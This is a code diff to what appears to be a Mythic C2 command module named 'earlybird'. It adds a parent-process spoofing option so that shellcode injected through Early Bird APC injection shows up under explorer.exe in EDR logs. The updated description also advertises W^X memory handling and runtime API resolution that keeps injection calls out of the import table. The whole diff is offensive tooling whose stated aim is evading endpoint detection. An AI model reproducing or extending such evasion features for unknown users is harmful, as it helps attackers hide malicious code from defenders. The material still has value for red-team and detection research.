@@ -23,6 +23,18 @@ class EarlybirdArguments(TaskArguments):
                 parameter_group_info=[ParameterGroupInfo(
                     group_name="Default", ui_position=1, required=True)],
             ),
+            CommandParameter(
+                name="parent_process",
+                type=ParameterType.String,
+                description=(
+                    "Process name to spoof as PPID of the spawned process. "
+                    "The spawned process will appear as a child of this process in EDR logs. "
+                    "Default: explorer.exe"
+                ),
+                default_value="explorer.exe",
+                parameter_group_info=[ParameterGroupInfo(
+                    group_name="Default", ui_position=2, required=False)],
+            ),
         ]
 
     async def parse_arguments(self):
@@ -33,11 +45,12 @@ class EarlybirdArguments(TaskArguments):
 class EarlybirdCommand(CommandBase):
     cmd = "earlybird"
     needs_admin = False
-    help_cmd = "earlybird -process C:\\Windows\\System32\\notepad.exe -shellcode <file>"
+    help_cmd = "earlybird -process C:\\Windows\\System32\\notepad.exe -shellcode <file> [-parent_process explorer.exe]"
     description = (
-        "Early Bird APC injection: spawns a process suspended, writes shellcode via "
-        "VirtualAllocEx + WriteProcessMemory, queues an APC on the main thread, "
-        "then resumes — shellcode executes before the process entry point."
+        "Early Bird APC injection with PPID spoofing: spawns a process suspended under a "
+        "chosen parent (default: explorer.exe), writes shellcode W^X (RW->RX), queues "
+        "an APC on the main thread, then resumes. All injection APIs resolved at runtime "
+        "(not in IAT). Shellcode executes before the process entry point."
     )
     version = 1
     author = "@0xbbuddha"
@@ -51,8 +64,9 @@ class EarlybirdCommand(CommandBase):
             Success=True,
         )
 
-        process = taskData.args.get_arg("process")
-        file_id = taskData.args.get_arg("shellcode")
+        process       = taskData.args.get_arg("process")
+        file_id       = taskData.args.get_arg("shellcode")
+        parent_process = taskData.args.get_arg("parent_process") or "explorer.exe"
 
         # Retrieve shellcode file content from Mythic and embed as base64
         # so the agent receives it directly without a separate file transfer.
@@ -76,7 +90,12 @@ class EarlybirdCommand(CommandBase):
             response.Error = f"Error fetching shellcode: {str(e)}"
             return response
 
-        response.DisplayParams = f"{process} ({len(file_resp.Content)} bytes)"
+        taskData.args.add_arg(
+            "parent_process",
+            parent_process,
+            parameter_group_info=[ParameterGroupInfo(group_name="Default")],
+        )
+        response.DisplayParams = f"{process} ({len(file_resp.Content)} bytes, PPID: {parent_process})"
         return response
 
     async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
